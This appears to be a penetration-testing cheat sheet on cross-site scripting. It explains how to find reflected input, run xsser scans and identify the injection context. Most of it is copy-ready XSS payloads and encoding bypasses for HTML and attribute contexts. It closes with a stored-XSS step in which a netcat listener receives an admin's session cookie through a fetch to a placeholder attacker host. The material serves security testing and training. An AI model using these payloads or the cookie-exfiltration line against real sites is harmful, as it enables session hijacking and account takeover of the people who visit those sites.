# 🖥️ Cross-Site Scripting (XSS)

---

## 📖 Description

Cross-Site Scripting (XSS) is a vulnerability that occurs when a web application includes user-controlled data in the page output without properly sanitizing it, allowing an attacker to **inject malicious JavaScript** that executes in the victim's browser.

The impact depends on the XSS type: from simple proof-of-concept popups to full session hijacking, credential theft, or delivering malware to users. The most critical scenario is **Stored XSS**, where the payload is saved in the database and executes for every user who visits the affected page — including administrators.

---

## 🔎 Detection

### Where to look

The first step is identifying all points where user input is reflected in the page. Always test the most common ones:

- **GET parameters** → `?q=`, `?search=`, `?name=`, `?msg=`, `?input=`
- **Form fields** → comments, search bars, registration, profile

Less likely, but also worth checking:

- **HTTP headers** → `User-Agent`, `Referer`, `X-Forwarded-For`
- **Cookies** → any cookie whose value is reflected in the page

### 🤖 Quick test with xsser

Before going manual, xsser can automate the discovery:

```bash
# GET parameters
python3 xsser -u "http://domain.com/page.php?param=XSS"

# POST parameters
python3 xsser -u "http://domain.com/page.php" -p "param=XSS&other=value"

# With an active session
python3 xsser -u "http://domain.com/page.php?param=XSS" \
  --cookie="PHPSESSID=xxxx"
```

### 📃 Identifying the context

Before throwing payloads, it's essential to understand **where the input lands in the HTML**. Inject this test string and inspect the source code:

```
TEST"><img/src=x>
```

The position of the string in the response tells us the context we're working in:

```
1️⃣ HTML CONTEXT    → appears as plain text inside a tag
   Example: <p>TEST"><img/src=x></p>

2️⃣ ATTRIBUTE CONTEXT → appears inside an HTML attribute
   Example: <input value="TEST"><img/src=x>">
```

The context determines which payloads will work, so this step must always come first.

---

## 💥 Types & Exploitation

---

### 1️⃣ HTML Context

The input is reflected as content between HTML tags. Standard script and event-based tags work directly here.

#### Basic payloads

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### Event-based (no closing tag needed)

```
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)"
" onclick="alert(1)"
```

#### ✋🏻 Bypasses

When filters block keywords or specific characters:

```html
<!-- Case variation -->
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</sCrIpT>

<!-- URL encoding -->
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E

<!-- Double encoding -->
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E

<!-- Attribute injection without breaking tags -->
"onmouseover="alert(1)
```

---

### 2️⃣ Attribute Context

The input lands inside an HTML attribute value. The goal is to **break out of the attribute** first, then inject executable code.

#### Basic payloads

```html
<!-- Breaking out with double quote -->
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>

<!-- Breaking out with single quote -->
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
'><svg onload=alert('XSS')>
```

#### Event-based (staying inside the attribute)

```
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)"
" onclick="alert(1)"
```

#### ✋🏻 Bypasses

```
<!-- URL encoding -->
%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E

<!-- Double encoding -->
%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
```

---

## 🔪 Post-Exploitation

If the identified XSS is **Stored**, it's possible to steal the admin's session cookie. Every time the admin visits the affected page, the payload fires and sends their cookie to our listener.

```bash
# 1. Start a listener
nc -lvnp 80

# 2. Inject the payload in the vulnerable field
<script>fetch('http://YOUR_IP/?c='+document.cookie)</script>
```

Once the cookie arrives in the listener, it can be used to impersonate the admin by replacing the session cookie in the browser.
